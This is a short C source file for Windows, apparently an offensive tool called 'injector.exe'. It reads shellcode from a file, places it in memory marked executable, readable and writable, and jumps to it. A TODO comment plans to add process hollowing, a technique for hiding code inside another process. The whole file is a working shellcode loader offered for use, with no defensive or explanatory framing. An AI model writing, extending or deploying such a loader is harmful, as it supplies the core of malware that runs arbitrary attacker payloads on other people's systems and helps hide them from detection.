#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// TODO: implement process hollowing

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("[?] Usage: injector.exe <shellcode-path>\n");
        return 1;
    }

    printf("[+] Reading shellcode from %s\n", argv[1]);
    FILE *fin = fopen(argv[1], "rb");

    if (fin == NULL)
    {
        printf("[!] Error: could not open file %s\n", argv[1]);
        return 1;
    }

    fseek(fin, 0, SEEK_END);
    long fsize = ftell(fin);
    rewind(fin);

    unsigned char *buffer = (char *)malloc(fsize);
    fread(buffer, fsize, 1, fin);
    fclose(fin);

    LPVOID base = VirtualAlloc(NULL, fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (base == NULL)
    {
        printf("[!] Error: could not allocate memory\n");
        return 1;
    }

    memcpy(base, buffer, fsize);

    printf("[+] Executing 'jmp *%%%p'\n", base);
    __asm__("jmp *%0\n" ::"r"(base));

    return 1;
}
